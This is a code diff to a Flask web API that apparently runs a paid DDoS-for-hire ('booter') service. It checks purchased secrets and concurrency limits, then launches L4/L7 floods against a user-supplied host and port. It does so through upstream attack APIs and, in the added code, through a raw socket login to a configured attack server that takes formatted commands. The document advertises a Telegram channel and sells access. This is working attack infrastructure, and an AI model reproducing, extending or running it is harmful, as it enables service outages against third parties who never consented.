@@ -5,6 +5,7 @@ import json
 import flask
 import threading
 import requests
+import socket
 import time as t
 
 app = flask.Flask(__name__)
@@ -15,21 +16,20 @@ global used_cons
 used_cons = 0
 
 global secrets
-secrets = {
-
-}
+secrets = {}
 
 global cooldowns
-cooldowns = [
-
-]
+cooldowns = []
 
 global concurrents
-concurrents = {
+concurrents = {}
 
-}
+global raw_methods
+raw_methods = []
+
 
 class API():
+
     def __init__(self) -> None:
         self.load()
 
@@ -48,8 +48,14 @@ class API():
         self.blacklisted_ports = self.config['attacks']['blacklisted']['ports']
         self.methods = self.config['attacks']['methods']
 
+        self.raw_host = self.config['attacks']['raw']['host']
+        self.raw_port = self.config['attacks']['raw']['port']
+        self.raw_username = self.config['attacks']['raw']['username']
+        self.raw_password = self.config['attacks']['raw']['password']
+        self.raw_methods = self.config['attacks']['raw']['methods']
+
         self.secrets = json.load(open('secrets.json'))['secrets']
-        for secret,val in self.secrets.items():
+        for secret, val in self.secrets.items():
             if secret not in secrets:
                 cons = val['cons']
                 time = val['time']
@@ -58,35 +64,34 @@ class API():
 
         # concurrent tracker
 
-        for secret,val in self.secrets.items():
+        for secret, val in self.secrets.items():
             if secret not in concurrents:
                 concurrents[secret] = '0'
 
         # secret updating (removing from the json file will remove them from the dicts/tables (in theory :skull:))
-        
+
         try:
             for secret in secrets:
                 if secret not in self.secrets:
                     secrets.pop(secret)
-            
+
             for secret in concurrents:
                 if secret not in self.secrets:
                     concurrents.pop(secret)
         except RuntimeError:
             pass
 
-        print(f'secret list: {secrets}')
-        print(f'concurrent list: {concurrents}')
-
     @staticmethod
-    def attack(host: str, port: str, time: str, method: str, cooldown: int, secret) -> None:
+    def attack(host: str, port: str, time: str, method: str, cooldown: int,
+               secret) -> None:
         global used_cons
         used_cons += 1
 
         global cooldowns
         global concurrents
 
-        for api in json.load(open('config.json'))['attacks']['methods']['wow']['apis']:
+        for api in json.load(
+                open('config.json'))['attacks']['methods']['wow']['apis']:
             try:
                 formatted = str(api).replace('{HOST}',host)\
                 .replace('{PORT}',port)\
@@ -95,6 +100,30 @@ class API():
                 print(requests.get(formatted).text)
             except:
                 pass
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((str(API().raw_host), int(API().raw_port)))
+
+            s.sendall(bytes(API().raw_username, 'utf-8') + b"\r\n")
+            s.sendall(bytes(API().raw_password, 'utf-8') + b"\r\n")
+
+            t.sleep(1)
+
+            format = f'{API().raw_methods[method]["usage"]}'.replace('{HOST}',host)\
+            .replace('{TIME}',time)\
+            .replace('{PORT}',port)\
+            .replace('{METHOD}',method)
+            attack_data = f"{format}\r\n"
+            s.sendall(bytes(attack_data, 'utf-8'))
+
+            print(
+                f"Attack sent to {host}:{port} for {time} seconds using method {method}!"
+            )
+
+            response = s.recv(4096).decode("utf-8")
+            while response:
+                print(response)
+                break
 
         print(f'''
         Attack Started:
@@ -122,11 +151,17 @@ class API():
 
         Global Cons In Use ({used_cons}/{API().global_cons})
         ''')
-  
+
         t.sleep(int(cooldown))
 
         concurrents[secret] = str(int(int(concurrents[secret]) - 1))
         cooldowns.remove(str(secret))
+
+
+@app.route('/')
+def index():
+    return flask.jsonify({'t.me/rawgigs': 'attack endpoint -> /api/attack'})
+
 
 @app.route('/api/attack')
 def attack():
@@ -145,7 +180,8 @@ def attack():
     if used_cons != API().global_cons:
         if secret not in secrets or secret == None:
             return flask.jsonify({
-                'status':f'invalid secret, purchase at {API().brand_link}',
+                'status':
+                f'invalid secret, purchase at {API().brand_link}',
             })
         else:
             cons = int(str(secrets[secret]).split(':')[0])
@@ -154,178 +190,418 @@ def attack():
             cooldown = str(secrets[secret]).split(':')[2]
         if used == cons:
             return flask.jsonify({
-                'status':f'you are using {str(used)}/{str(cons)} of your concurrents.',
-            })  
+                'status':
+                f'you are using {str(used)}/{str(cons)} of your concurrents.',
+            })
+        if host == None:
+            return flask.jsonify({
+                'status': f'no host provided',
+            })
+        if port == None:
+            return flask.jsonify({
+                'status': f'no port provided',
+            })
+        if time == None:
+            return flask.jsonify({
+                'status': f'no time provided',
+            })
+        if method == None:
+            return flask.jsonify({
+                'status': f'no method provided',
+            })
         if int(time) > int(timee):
             return flask.jsonify({
-                'status':f'your plans maximum time is {timee}s',
-            })  
+                'status':
+                f'your plans maximum time is {timee}s',
+            })
         if str(secret) in cooldowns:
             return flask.jsonify({
-                'status':f'you are currently under a {cooldown}s cooldown',
-            })  
+                'status':
+                f'you are currently under a {cooldown}s cooldown',
+            })
         if str(API().attacks_enabled).upper() == 'FALSE':
             return flask.jsonify({
-                'status':f'attacks are currently disabled',
-            })  
+                'status': f'attacks are currently disabled',
+            })
         for hostt in API().blacklisted_hosts:
             if host.find(hostt) != -1:
                 bl_host = True
         for portt in API().blacklisted_ports:
             if port.find(portt) != -1:
-                bl_port = True  
+                bl_port = True
         if bl_host == True:
             return flask.jsonify({
-                'status':f'host is blacklisted',
-             })   
+                'status': f'host is blacklisted',
+            })
         if bl_port == True:
             return flask.jsonify({
-                'status':f'port is blacklisted',
-             })
-        if str(API().methods[method]['type']).upper() == 'L4':
-            try:
-                for i in requests.get(f'https://ipapi.co/{host}/json').json():
-                    if i == 'error':
-                        return flask.jsonify({
-                            'status':f'invalid ip address',
-                        })  
-            except requests.JSONDecodeError:
-                return flask.jsonify({
-                    'status':f'invalid ip address',
-                })  
+                'status': f'port is blacklisted',
+            })
         if method in API().methods:
-            if str(API().methods[method]['enabled']).upper() != 'FALSE':
-                if str(API().methods[method]['type']).upper() == 'L4':
-                    threading.Thread(target=API().attack,args=(host,port,time,method,cooldown,str(secret),)).start()
-                    if str(API().html).upper() == 'FALSE':
-                        return flask.jsonify({
-                            'status':'attack sent',
-                            'host':host,
-                            'port':port,
-                            'time':time,
-                            'method':method,
-                            'global_cons':f'{used_cons}/{API().global_cons}',
-                            'info':requests.get(f'https://ipapi.co/{host}/json').json()
-                        })
-                    else:
-                        return '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attack Sent</title>
-    <style>
-        body,html {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: rgb(19,19,19);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-        }
+            print("FUNNEL METHOD IN USEEEEEEE")
+            if str(API().methods[method]['type']).upper() == 'L4':
+                try:
+                    for i in requests.get(
+                            f'https://ipapi.co/{host}/json').json():
+                        if i == 'error':
+                            return flask.jsonify({
+                                'status':
+                                f'invalid ip address',
+                            })
+                except requests.JSONDecodeError:
+                    return flask.jsonify({
+                        'status': f'invalid ip address',
+                    })
+            if method in API().methods:
+                if str(API().methods[method]['enabled']).upper() != 'FALSE':
+                    if str(API().methods[method]['type']).upper() == 'L4':
+                        threading.Thread(target=API().attack,
+                                         args=(
+                                             host,
+                                             port,
+                                             time,
+                                             method,
+                                             cooldown,
+                                             str(secret),
+                                         )).start()
+                        if str(API().html).upper() == 'FALSE':
+                            t.sleep(3)
+                            return flask.jsonify({
+                                'status':
+                                'attack sent',
+                                'host':
+                                host,
+                                'port':
+                                port,
+                                'time':
+                                time,
+                                'method':
+                                method,
+                                'global_cons':
+                                f'{used_cons}/{API().global_cons}',
+                                'info':
+                                requests.get(
+                                    f'https://ipapi.co/{host}/json').json()
+                            })
+                        else:
+                            t.sleep(3)
+                            return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Attack Sent</title>
+        <style>
+            body,html {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: rgb(19,19,19);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: sans-serif;
+                text-align: center;
+            }
 
-        .sent {
-            padding: 10px;
-            width: 400px;
-            height: 300px;
-            border-style: solid;
-            border-color: rgb(30,30,30);
-            border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            flex-direction: column;
-        }
-    </style>
-</head>
-<body>
-    <div class="sent">
-        <h1>🚀Attack Sent!</h1>
-        <p>Host: '''+host+'''</p>
-        <p>Port: '''+port+'''</p>
-        <p>Time: '''+time+'''</p>
-        <p>Method: '''+method+'''</p>
-    </div>
-</body>
-</html>
-                        '''
+            .sent {
+                padding: 10px;
+                width: 400px;
+                height: 300px;
+                border-style: solid;
+                border-color: rgb(30,30,30);
+                border-radius: 10px;
+                display: flex;
+                justify-content: center;
+                flex-direction: column;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="sent">
+            <h1>🚀Attack Sent!</h1>
+            <p>Host: ''' + host + '''</p>
+            <p>Port: ''' + port + '''</p>
+            <p>Time: ''' + time + '''</p>
+            <p>Method: ''' + method + '''</p>
+        </div>
+    </body>
+    </html>
+                            '''
+                    else:
+                        threading.Thread(target=API().attack,
+                                         args=(
+                                             host,
+                                             port,
+                                             time,
+                                             method,
+                                             cooldown,
+                                             str(secret),
+                                         )).start()
+                        if str(API().html).upper() == 'FALSE':
+                            t.sleep(3)
+                            return flask.jsonify({
+                                'status':
+                                'attack sent',
+                                'host':
+                                host,
+                                'port':
+                                port,
+                                'time':
+                                time,
+                                'method':
+                                method,
+                                'global_cons':
+                                f'{used_cons}/{API().global_cons}',
+                            })
+                        else:
+                            t.sleep(3)
+                            return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Attack Sent</title>
+        <style>
+            body,html {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: rgb(19,19,19);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: sans-serif;
+                text-align: center;
+            }
+
+            .sent {
+                padding: 10px;
+                width: 400px;
+                height: 300px;
+                border-style: solid;
+                border-color: rgb(30,30,30);
+                border-radius: 10px;
+                display: flex;
+                justify-content: center;
+                flex-direction: column;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="sent">
+            <h1>🚀Attack Sent!</h1>
+            <p>Host: ''' + host + '''</p>
+            <p>Port: ''' + port + '''</p>
+            <p>Time: ''' + time + '''</p>
+            <p>Method: ''' + method + '''</p>
+        </div>
+    </body>
+    </html>
+                            '''
                 else:
-                    threading.Thread(target=API().attack,args=(host,port,time,method,cooldown,str(secret),)).start()
-                    if str(API().html).upper() == 'FALSE':
-                        return flask.jsonify({
-                            'status':'attack sent',
-                            'host':host,
-                            'port':port,
-                            'time':time,
-                            'method':method,
-                            'global_cons':f'{used_cons}/{API().global_cons}',
-                            'info':requests.get(f'https://ipapi.co/{host}/json').json()
-                        })
-                    else:
-                        return '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attack Sent</title>
-    <style>
-        body,html {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: rgb(19,19,19);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-        }
-
-        .sent {
-            padding: 10px;
-            width: 400px;
-            height: 300px;
-            border-style: solid;
-            border-color: rgb(30,30,30);
-            border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            flex-direction: column;
-        }
-    </style>
-</head>
-<body>
-    <div class="sent">
-        <h1>🚀Attack Sent!</h1>
-        <p>Host: '''+host+'''</p>
-        <p>Port: '''+port+'''</p>
-        <p>Time: '''+time+'''</p>
-        <p>Method: '''+method+'''</p>
-    </div>
-</body>
-</html>
-                        '''
+                    return flask.jsonify({
+                        'status':
+                        f'method is currently disabled',
+                    })
             else:
                 return flask.jsonify({
-                    'status':f'method is currently disabled',
-                })  
+                    'status': f'method does not exist',
+                })
+        elif method in API().raw_methods:
+            print("RAW METHOD IN USEEEEEEE")
+            if str(API().raw_methods[method]['type']).upper() == 'L4':
+                try:
+                    for i in requests.get(
+                            f'https://ipapi.co/{host}/json').json():
+                        if i == 'error':
+                            return flask.jsonify({
+                                'status':
+                                f'invalid ip address',
+                            })
+                except requests.JSONDecodeError:
+                    return flask.jsonify({
+                        'status': f'invalid ip address',
+                    })
+            if method in API().raw_methods:
+                if str(API().raw_methods[method]
+                       ['enabled']).upper() != 'FALSE':
+                    if str(API().raw_methods[method]['type']).upper() == 'L4':
+                        threading.Thread(target=API().attack,
+                                         args=(
+                                             host,
+                                             port,
+                                             time,
+                                             method,
+                                             cooldown,
+                                             str(secret),
+                                         )).start()
+                        if str(API().html).upper() == 'FALSE':
+                            t.sleep(3)
+                            return flask.jsonify({
+                                'status':
+                                'attack sent',
+                                'host':
+                                host,
+                                'port':
+                                port,
+                                'time':
+                                time,
+                                'method':
+                                method,
+                                'global_cons':
+                                f'{used_cons}/{API().global_cons}',
+                                'info':
+                                requests.get(
+                                    f'https://ipapi.co/{host}/json').json()
+                            })
+                        else:
+                            t.sleep(3)
+                            return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Attack Sent</title>
+        <style>
+            body,html {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: rgb(19,19,19);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: sans-serif;
+                text-align: center;
+            }
+
+            .sent {
+                padding: 10px;
+                width: 400px;
+                height: 300px;
+                border-style: solid;
+                border-color: rgb(30,30,30);
+                border-radius: 10px;
+                display: flex;
+                justify-content: center;
+                flex-direction: column;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="sent">
+            <h1>🚀Attack Sent!</h1>
+            <p>Host: ''' + host + '''</p>
+            <p>Port: ''' + port + '''</p>
+            <p>Time: ''' + time + '''</p>
+            <p>Method: ''' + method + '''</p>
+        </div>
+    </body>
+    </html>
+                            '''
+                    else:
+                        threading.Thread(target=API().attack,
+                                         args=(
+                                             host,
+                                             port,
+                                             time,
+                                             method,
+                                             cooldown,
+                                             str(secret),
+                                         )).start()
+                        if str(API().html).upper() == 'FALSE':
+                            t.sleep(3)
+                            return flask.jsonify({
+                                'status':
+                                'attack sent',
+                                'host':
+                                host,
+                                'port':
+                                port,
+                                'time':
+                                time,
+                                'method':
+                                method,
+                                'global_cons':
+                                f'{used_cons}/{API().global_cons}',
+                            })
+                        else:
+                            t.sleep(3)
+                            return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Attack Sent</title>
+        <style>
+            body,html {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: rgb(19,19,19);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: sans-serif;
+                text-align: center;
+            }
+
+            .sent {
+                padding: 10px;
+                width: 400px;
+                height: 300px;
+                border-style: solid;
+                border-color: rgb(30,30,30);
+                border-radius: 10px;
+                display: flex;
+                justify-content: center;
+                flex-direction: column;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="sent">
+            <h1>🚀Attack Sent!</h1>
+            <p>Host: ''' + host + '''</p>
+            <p>Port: ''' + port + '''</p>
+            <p>Time: ''' + time + '''</p>
+            <p>Method: ''' + method + '''</p>
+        </div>
+    </body>
+    </html>
+                            '''
+                else:
+                    return flask.jsonify({
+                        'status':
+                        f'method is currently disabled',
+                    })
+            else:
+                return flask.jsonify({
+                    'status': f'method does not exist',
+                })
         else:
-            return flask.jsonify({
-                'status':f'method does not exist',
-            })   
+            return flask.jsonify({'status': 'method does not exist'})
     else:
         return flask.jsonify({
-            'status':f'global cons is {API().global_cons}/{used_cons}',
+            'status':
+            f'global cons is {API().global_cons}/{used_cons}',
         })
 
-app.run(API().host, API().port)
+app.run()
